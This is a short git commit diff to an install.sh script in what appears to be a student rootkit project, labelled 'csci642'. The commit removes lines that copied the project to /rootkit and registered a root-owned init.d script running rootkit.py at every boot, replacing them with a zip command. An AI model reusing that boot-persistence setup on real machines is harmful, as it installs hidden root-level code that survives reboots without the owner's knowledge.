e8a9329c7c6f08e8d3c962a9808b7bc4592d2c23
Nathaniel Cotton <ncotton6@gmail.com>
2016-11-02 09:37:01 -0400

    working on making an all inclusive package

--- install.sh
+++ install.sh
@@ -2,14 +2,6 @@
 sudo apt-get install python3-pip
 sudo pip3 install python-xlib
 
-mkdir -p /rootkit
-cp -r . /rootkit/
+zip -r kit.zip *
 
-cat > /etc/init.d/csci642.sh << EOF
-#!/bin/bash
-python3 /rootkit/rootkit.py
-EOF
-	
-chown root /etc/init.d/csci642.sh
-chmod 700 /etc/init.d/csci642.sh
-update-rc.d csci642.sh defaults
+
